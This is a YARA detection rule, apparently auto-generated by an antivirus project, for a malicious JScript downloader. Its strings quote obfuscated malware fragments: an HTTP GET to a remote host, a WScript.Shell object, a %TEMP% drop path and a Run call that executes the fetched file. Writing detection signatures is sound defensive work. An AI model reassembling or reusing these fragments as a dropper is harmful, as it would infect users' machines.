rule sig_20160427_6095e73c36c8b7dd4c4a461b5e59e885 {
  meta:
    description = "datamaliciousorder - file 20160427_6095e73c36c8b7dd4c4a461b5e59e885.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "691dcebba448ec884af8a48eabaa8f71968ac3a66ea309e07ca6ba485937241e"

  strings:
    $s1  = "BddnzBifyf[ZeaqcKjcpg](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function FwchvQjspb() {return SkthyTsoqr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qD2IUsH" ascii
    $s3  = "function FwchvQjspb() {return SkthyTsoqr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qD2IUsH" ascii
    $s4  = "var SkthyTsoqr = function WabouHljrb() {return RhhzpAqfql[UfjdcLzrey](\"WScript\"+\".Shell\");}(), EuohgImbim = 11;" fullword ascii
    $s5  = "function ArxeiXfvqv(YytzzHxfmz, VvzrsEdyku){NecusAkqlf = NecusAkqlf * 1; return YytzzHxfmz - VvzrsEdyku;};" fullword ascii
    $s6  = "var RhhzpAqfql = this[\"WScript\"];" fullword ascii
    $s7  = "if (BddnzBifyf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function GmhazFowon(){return NcookKypkh + \"\";};" fullword ascii
    $s9  = "function UpzomNzlhm() {return ((KiqbeTpzsz == true) && (KiqbeTpzsz == UnegbPoohz)) ? 1 : NecusAkqlf;};" fullword ascii
    $s10 = "function UvutoIcfbg(){return UfjdcLzrey;};" fullword ascii
    $s11 = "function OhcncDvqem(QogduUlcwl){SkthyTsoqr[\"R\"+\"un\"](QogduUlcwl, NecusAkqlf, NecusAkqlf);};" fullword ascii
    $s12 = "var NmuhyNkafu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "var KiqbeTpzsz = false;" fullword ascii
    $s14 = "var UnegbPoohz = false;" fullword ascii
    $s15 = "GepowZypme = true;" fullword ascii
    $s16 = "function KjyqkTawom(){return 23;};" fullword ascii
    $s17 = "var GepowZypme = false;" fullword ascii
    $s18 = "function QoxefAfdnc()" fullword ascii
    $s19 = "}while (VvltlDaqvu);" fullword ascii
    $s20 = "UnegbPoohz = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}